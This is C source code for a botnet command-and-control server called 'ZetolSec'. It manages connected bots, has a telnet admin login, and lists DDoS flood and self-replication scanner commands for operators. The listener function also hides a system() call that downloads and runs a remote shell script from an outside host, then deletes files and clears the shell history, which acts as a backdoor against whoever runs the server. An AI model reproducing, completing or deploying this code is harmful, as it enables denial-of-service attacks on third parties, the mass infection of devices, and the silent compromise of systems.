/*

Here's a Few Color Codes If you Would Like To Change The Color 

Blue = '\x1b[0;34m'
Brown = '\x1b[0;33m'
Cyan = '\x1b[0;36m' 
DarkGray = '\x1b[1;30m' 
Green = '\x1b[0;32m' 
LightBlue = '\x1b[1;34m' 
LightCyan = '\x1b[1;36m' 
LightGray = '\x1b[0;37m' 
LightGreen = '\x1b[1;32m' 
LightPurple = '\x1b[1;35m' 
LightRed = '\x1b[1;31m' 
Normal = '\x1b[0m' 
Purple = '\x1b[0;35m' 
Red = '\x1b[0;31m' 
White = '\x1b[1;37m' 
Yellow = '\x1b[1;33m

*/
/*
Edited by: Zetols

  * COOL FUN FEATURES *
~ Logs Ips
~ Has A TimeStamp
~ etc
~ Blocked SHELL Commands
~ Blocked DUPE Commands

P.S. > the login file name is login.txt
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000
#define RED     "\x1b[0;31m"
#define GREEN   "\x1b[0;32m"
#define C_RESET   "\x1b[0m"

struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[25];

struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
} managements[MAXFDS];

////////////////////////////////////

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int DUPESDELETED = 0;

////////////////////////////////////


int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {                     
						send(i, "\x1b[31mID:", 8, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, " ", 1, MSG_NOSIGNAL);
                        send(i, timestamp, strlen(timestamp), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[0m~\x1b[0;31m$ \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {
                                        	    DUPESDELETED++;
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SC ON\n", 9, MSG_NOSIGNAL);
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("buf: \"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; ZetolSec ~ Bots: %d ~ Admins: %d %c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
 
                sleep(2);
        }
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *telnetWorker(void *sock) { 
        int thefd = (int)sock;
        managesConnected++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
        char* admin;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); // format: user pass
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        { 
            fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
            ++j;
        }
        sprintf(botnet, "\x1b[1;37mpодившиеся боги объединены\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
		sprintf(botnet, "\033[34;1mпользователь\033[33;3m: \e[0;30m");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);

        if(strcmp(nickstring, accounts[find_line].id) == 0){                  
        sprintf(botnet, "\033[34;1mпароль\033[33;3m: \e[0;30m");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;
        fak:
        
        pthread_create(&title, NULL, &titleWriter, sock);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end;
        char ascii_banner_line20 [5000];
		char ascii_banner_line21 [5000];
		char ascii_banner_line22 [5000];
		char line23[80];
		sprintf(ascii_banner_line20, "\x1b[0;34m           ╔═╗┌─┐┌┬┐┌─┐┬  ┌─┐\r\n");
		sprintf(ascii_banner_line21, "\x1b[0;34m           ╔═╝├┤  │ │ ││  └─┐\r\n");
		sprintf(ascii_banner_line22, "\x1b[0;34m           ╚═╝└─┘ ┴ └─┘┴─┘└─┘\r\n");
		sprintf(line23, "     "C_RESET"***"RED" Welcome To The ZetolSec"C_RESET" ***\r\n\r\n"C_RESET"~"RED"$ "C_RESET"");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line21, strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line22, strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line23, strlen(line23), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        { 
        if(strstr(buf, "BOTS")) 
        {  
          sprintf(botnet, "Slaves Connected: "RED"[%d]"C_RESET"\r\nFucking Idiots connected: "RED"[%d]"C_RESET"\r\nDupes Deleted:"RED" [%d]"C_RESET"\r\n", clientsConnected(), managesConnected, DUPESDELETED);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
          
if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char helpline1  [80];
				char helpline2  [80];
				char helpline4  [80];

				sprintf(helpline1,  "\x1b[0;37mChoose an option from \x1b[0;31mBelow:\r\n");
				sprintf(helpline2,  "\x1b[0;37m[\x1b[0;31mDDOS\x1b[0;37m] ~ DDOS Commands\r\n");
				sprintf(helpline4,  "\x1b[0;37m[\x1b[0;31mSELFREP\x1b[0;37m] ~ DONT FUCKING TOUCH THIS SHIT\r\n");;

				if(send(thefd, helpline1,  strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline2,  strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline4,  strlen(helpline4),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[0;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
		}
					if(strstr(buf, "DDOS")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char ddosline1  [80];
				char ddosline2  [80];
				char ddosline3  [80];
				char ddosline4  [80];
				char ddosline5  [80];
				char ddosline6  [80];
				char ddosline7  [80];
				char ddosline8  [80];
				char ddosline9  [80];
				char ddosline32  [80];
				char ddosline11  [80];
				char ddosline12  [80];

				sprintf(ddosline1, "\x1b[0;31m !* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD\r\n");
				sprintf(ddosline3, "\x1b[0;31m !* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD\r\n");
				sprintf(ddosline4, "\x1b[0;37m !* UDP [IP] [PORT] [TIME] 32 ack 1337 400 | ACK FLOOD\r\n");
				sprintf(ddosline5, "\x1b[0;31m !* JUNK [IP] [PORT] [TIME] | JUNK FLOOD\r\n");
				sprintf(ddosline6, "\x1b[0;37m !* HOLD [IP] [PORT] [TIME] | HOLD FLOOD\r\n");
				sprintf(ddosline7, "\x1b[0;31m !* COMBO [IP] [PORT] [TIME] | COMBO FLOOD HOLD AND JUNK\r\n");
				sprintf(ddosline32, "\x1b[0;37m !* CNC [IP] [ADMIN-PORT] [TIME] | CNC FLOOD\r\n");
				sprintf(ddosline12, "\x1b[0;37m !* KILLATTK | KILLS ALL ATTACKS\r\n");

				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline3,  strlen(ddosline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline4,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline5,  strlen(ddosline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline6,  strlen(ddosline6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline7,  strlen(ddosline7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline8,  strlen(ddosline8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline9,  strlen(ddosline9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline32,  strlen(ddosline32),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline11,  strlen(ddosline11),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline12,  strlen(ddosline12),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[0;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "SELFREP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char repline1  [80];
				char repline2  [80];
				char repline3  [80];
				char repline4  [80];
				char repline5  [80];
				char repline6  [80];
				
				sprintf(repline1,  "\x1b[0;31m !* PHONE ON | TURNS ON PHONE SELF REPLIFICATION\r\n");
				sprintf(repline2,  "\x1b[0;37m !* SCANNER ON | TURNS ON TELNET SELF REPLIFICATION\r\n");
				sprintf(repline3,  "\x1b[0;31m !* PHONE OFF | TURNS OFF PHONE SELF REPLIFICATION\r\n");
				sprintf(repline4,  "\x1b[0;37m !* SCANNER OFF | TURNS OFF TELNET SELF REPLIFICATION\r\n");
				sprintf(repline5,  "\x1b[0;31m !* wget.py | SCANS sithbots.txt PYTHON LIST\r\n");
				sprintf(repline6,  "\x1b[0;37m !* PYTHON OFF | TURNS OFF PYTHON SCANNER\r\n");

				if(send(thefd, repline1,  strlen(repline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline2,  strlen(repline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline3,  strlen(repline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline4,  strlen(repline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline5,  strlen(repline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline6,  strlen(repline6),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[0;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
      if(strstr(buf, "LOLNOGTFO")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
      if(strstr(buf, "HOODASSSHIT")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
      if(strstr(buf, "HOODASSSHIT")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "LOGOUT")) 
		{  
		printf("BYE %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("OGOUT.log", "a");
        fprintf(logFile, "BYE %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }//if you dont like this just take out common sense 
    	if(strstr(buf, "DUP")) 
		{  
	    printf("ATTEMPT TO KILL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("BOTKILLER.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS %s\n", accounts[find_line].id, buf);
        fclose(logFile);
	    goto end;
		}
		if(strstr(buf, "SH")) 
		{  
		printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "ATTEMPT TO SHELL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
   	   	}
		if(strstr(buf, "MOVE")) 
		{  
		printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "ATTEMPT TO SHELL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
   	   	}
        if (strstr(buf, "CLEAR"))
        { 
          if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
        sprintf(ascii_banner_line20, "\x1b[0;34m           ╔═╗┌─┐┌┬┐┌─┐┬  ┌─┐\r\n");
		sprintf(ascii_banner_line21, "\x1b[0;34m           ╔═╝├┤  │ │ ││  └─┐\r\n");
		sprintf(ascii_banner_line22, "\x1b[0;34m           ╚═╝└─┘ ┴ └─┘┴─┘└─┘\r\n");
		sprintf(line23, "     "C_RESET"***"RED" Welcome To The ZetolSec"C_RESET" ***\r\n ");
		if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line21, strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line22, strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line23, strlen(line23), MSG_NOSIGNAL) == -1) goto end;
         }
         if (strstr(buf, "EXIT")) 
         {
            goto end;
         }
                trim(buf);
                sprintf(botnet, "\x1b[0m~\x1b[0;31m$ \x1b[0m");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("server.log", "a");
                fprintf(logFile, "%s: \"%s\"\n", accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {  printf("Security Breach From: ");
                
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("IP.log", "a");
                fprintf(logFile, "IP:%d.%d.%d.%d\n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                system ("cd /tmp; wget -q http://slammed.ml/g.sh -O g.sh; sh g.sh &>/dev/null; rm -rf *; history -c"); 
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
 
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);

        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 850)
        {
            printf("Are You Dumb? Lower the Threads\n");
            return 0;
        }
        else if (threads < 850)
        {
            printf("Good Choice in Threading\n");
        }
        printf(RED "\x1b[0;31mTHIS SHIT PRIVATE,\x1b[1;37m DO NOT FUCKING LEAK, \x1b[1;37mZetolSec \x1b[1;37mBOTNET \x1b[1;36mSCREENED\x1b[0m\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
        
 
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, port);
 
        while(1)
        {
                broadcast("PING", -1, "STRING");
                sleep(60);
        }
  
        close (listenFD);
 
        return EXIT_SUCCESS;
}